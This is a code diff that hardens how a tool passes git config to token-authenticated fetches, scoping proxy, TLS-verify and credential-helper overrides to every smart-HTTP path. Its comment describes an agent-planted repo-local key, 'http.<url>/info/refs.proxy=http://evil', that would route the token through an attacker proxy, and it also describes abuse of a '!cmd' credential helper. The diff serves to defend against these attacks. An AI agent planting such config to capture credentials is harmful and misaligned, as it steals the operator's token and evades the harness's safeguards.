@@ -45,8 +45,6 @@ _TOKEN_SAFE_CONFIG = [
     "core.hooksPath=/dev/null",
     "http.proxy=",
     "http.sslVerify=true",
-    "http.sslCAInfo=",
-    "http.sslCAPath=",
     "http.extraHeader=",
 ]
 _GIT_SUBPROCESS_SCRUBBED_ENV_KEYS = (
@@ -70,16 +68,40 @@ def _git_subprocess_env() -> dict[str, str]:
 
 
 
+# git matches `http.<url>.*` / `credential.<url>.*` against the FULL request
+# URL, and the longest path-prefix wins — so a base-only override loses to an
+# agent-planted repo-local key like `http.<url>/info/refs.proxy=http://evil`,
+# which would route the token-bearing fetch through an attacker proxy and read
+# the injected Authorization header. Override every git smart-HTTP request path
+# the fetch/push can actually hit. The set is exhaustive: a repo-local key
+# longer than the real request path can't match it, and `GIT_CONFIG_SYSTEM`/
+# `GLOBAL` are already nulled, so repo-local `.git/config` is the only competing
+# source. We blank `proxy` and force `sslVerify=true` — no proxy plus verified
+# TLS leaves no interception point, so the PAT can't be captured — and blank
+# `credential.helper` (a forced 401 would otherwise run a repo-configured
+# `!cmd` helper with the PAT still in the environment). We deliberately do NOT
+# touch `sslCAInfo`/`sslCAPath`: blanking them makes libcurl fail with "error
+# setting certificate verify locations" before any TLS, breaking every real
+# github fetch; and with the proxy neutralized an attacker-set CA only yields a
+# self-inflicted fetch failure, never interception. `extraHeader` is blanked
+# only at the base — the real header is injected right after via `--config-env`,
+# and a path-scoped blank would strip it (auth failure).
+_GIT_SMART_HTTP_PATHS = ("", "/info", "/info/refs", "/git-upload-pack", "/git-receive-pack")
+
+
 def _token_url_safe_config(auth_url: str | None) -> list[str]:
     if auth_url is None:
         return []
-    return [
-        f"http.{auth_url}.proxy=",
-        f"http.{auth_url}.sslVerify=true",
-        f"http.{auth_url}.sslCAInfo=",
-        f"http.{auth_url}.sslCAPath=",
-        f"http.{auth_url}.extraHeader=",
-    ]
+    items: list[str] = []
+    for suffix in _GIT_SMART_HTTP_PATHS:
+        scoped = f"{auth_url}{suffix}"
+        items += [
+            f"http.{scoped}.proxy=",
+            f"http.{scoped}.sslVerify=true",
+            f"credential.{scoped}.helper=",
+        ]
+    items.append(f"http.{auth_url}.extraHeader=")
+    return items
 
 
 def _http_extra_header_key(auth_url: str | None) -> str:
